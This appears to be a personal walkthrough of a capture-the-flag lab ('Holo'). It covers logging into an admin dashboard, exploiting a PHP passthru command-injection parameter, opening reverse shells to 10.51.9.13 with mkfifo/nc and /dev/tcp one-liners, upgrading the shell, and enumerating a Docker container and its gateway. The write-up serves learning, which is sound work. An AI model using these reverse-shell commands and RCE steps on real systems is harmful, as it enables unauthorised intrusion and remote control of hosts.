
```
admin
```

```
DBManagerLogin!
```

So we are in 

![[Pasted image 20240813203006.png]]

And we can see php is there let's see how to get the shell from here 

So i pasted the code that i found in the source code 
```
  <!--                   //if ($_GET['cmd'] === NULL) { echo passthru("cat /tmp/Views.txt"); } else { echo passthru($_GET['cmd']);} -->
```

and found that we have RCE here

```
http://admin.holo.live/dashboard.php?cmd=whoami
```
![[Pasted image 20240813203426.png]]

let's see if we are able to get a reverse shell

So i tried to get the version of python but i don't think it's installed (i.e. check which python)
but than bash came to my mind and it returned (i.e. which bash)
```
admin.holo.live/dashboard.php?cmd=which%20bash
```
![[Pasted image 20240813203747.png]]


After so many try's this one linear working as website got stuck which is an indication we might have got a shell
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.51.9.13 4242 >/tmp/f
```

```
%2Fbin%2Fbash -i >%26 %2Fdev%2Ftcp%2F10.51.9.13%2F4242 0>%261
```

![[Pasted image 20240813204209.png]]

Let's get the full shell from the dummy shell

```
python3 -c "__import__('pty').spawn('/bin/bash')"
stty -raw echo;fg 
reset.

export TERM=xterm
```

![[Pasted image 20240813204531.png]]

Let's run the linpeas's and see what we find here
```
cat user.txt
HOLO{175d7322f8fc53392a417ccde356c3fe}
```

```
hostname
e932f030b3c8
```

```
uname -a
Linux e932f030b3c8 5.4.0-1030-aws #31-Ubuntu SMP Fri Nov 13 11:40:37 UTC 2020 x86_64 x86_64 x86_64 GNU/Linux
```

```
ps aux
USER         PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root           1  0.0  0.0   4632   824 pts/0    Ss   10:00   0:00 /bin/sh -c /e
root          27  0.0  0.4 373648 18708 ?        Ss   10:00   0:00 /usr/sbin/apa
www-data      30  0.0  0.3 374204 13004 ?        S    10:00   0:00 /usr/sbin/apa
www-data      31  0.0  0.1 373680  6980 ?        S    10:00   0:00 /usr/sbin/apa
www-data      32  0.0  0.3 374204 14128 ?        S    10:00   0:00 /usr/sbin/apa
www-data      33  0.0  0.2 374048 10972 ?        S    10:00   0:00 /usr/sbin/apa
www-data      34  0.0  0.1 373680  6980 ?        S    10:00   0:00 /usr/sbin/apa
mysql         75  0.0  0.0   4632  1720 ?        S    10:00   0:00 /bin/sh /usr/
mysql        429  0.1  4.6 1621092 188216 ?      Sl   10:00   0:01 /usr/sbin/mys
root         509  0.0  0.0  18512  3132 pts/0    S+   10:00   0:00 /bin/bash
www-data     516  0.0  0.1 373680  6984 ?        S    10:04   0:00 /usr/sbin/apa
www-data     517  0.0  0.0   4632   772 ?        S    10:04   0:00 sh -c rm /tmp
www-data     520  0.0  0.0   4676   744 ?        S    10:04   0:00 cat /tmp/f
www-data     521  0.0  0.0  18512  3420 ?        S    10:04   0:00 bash -i
www-data     522  0.0  0.0   6652  1892 ?        R    10:04   0:00 nc 10.51.9.13
www-data     527  0.0  0.2  36812  8532 ?        S    10:11   0:00 /usr/bin/pyth
www-data     528  0.0  0.0  18512  3396 pts/1    Ss   10:11   0:00 /bin/bash
www-data     550  0.0  0.0  34408  2800 pts/1    R+   10:28   0:00 ps aux
```

```
find / -perm -u=s -type f 2>/dev/null
/bin/umount
/bin/su
/bin/mount
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/passwd
/usr/bin/chfn
/usr/bin/chsh
```

```
cat /proc/1 cgroup
```

```
www-data@e932f030b3c8:/proc/1$ cat cgroup
cat cgroup
12:memory:/docker/e932f030b3c8681060f99dd5f2f180c8d080653491e81791490f879c869c2f9c
11:freezer:/docker/e932f030b3c8681060f99dd5f2f180c8d080653491e81791490f879c869c2f9c
10:devices:/docker/e932f030b3c8681060f99dd5f2f180c8d080653491e81791490f879c869c2f9c
9:blkio:/docker/e932f030b3c8681060f99dd5f2f180c8d080653491e81791490f879c869c2f9c
8:cpuset:/docker/e932f030b3c8681060f99dd5f2f180c8d080653491e81791490f879c869c2f9c
7:rdma:/
6:pids:/docker/e932f030b3c8681060f99dd5f2f180c8d080653491e81791490f879c869c2f9c
5:perf_event:/docker/e932f030b3c8681060f99dd5f2f180c8d080653491e81791490f879c869c2f9c
4:net_cls,net_prio:/docker/e932f030b3c8681060f99dd5f2f180c8d080653491e81791490f879c869c2f9c
3:cpu,cpuacct:/docker/e932f030b3c8681060f99dd5f2f180c8d080653491e81791490f879c869c2f9c
2:hugetlb:/docker/e932f030b3c8681060f99dd5f2f180c8d080653491e81791490f879c869c2f9c
1:name=systemd:/docker/e932f030b3c8681060f99dd5f2f180c8d080653491e81791490f879c869c2f9c
0::/system.slice/containerd.service
```

As we are not able to upload the nmap or anyfile for pingsweep so we have to come back to basics.
![[Pasted image 20240817165551.png]]

![[Pasted image 20240817165859.png]]

So we have to find the default Gateway
```
192.168.100.1
```

So will simply run the ping sweep on this

```
nc -zv 192.168.100.1 1-65535
ip-192-168-100-1.eu-west-1.compute.internal [192.168.100.1] 33060 (?) open
ip-192-168-100-1.eu-west-1.compute.internal [192.168.100.1] 8080 (http-alt) open
ip-192-168-100-1.eu-west-1.compute.internal [192.168.100.1] 3306 (mysql) open
ip-192-168-100-1.eu-west-1.compute.internal [192.168.100.1] 80 (http) open
ip-192-168-100-1.eu-west-1.compute.internal [192.168.100.1] 22 (ssh) open
```

So which service looks juicy is mysql 3306


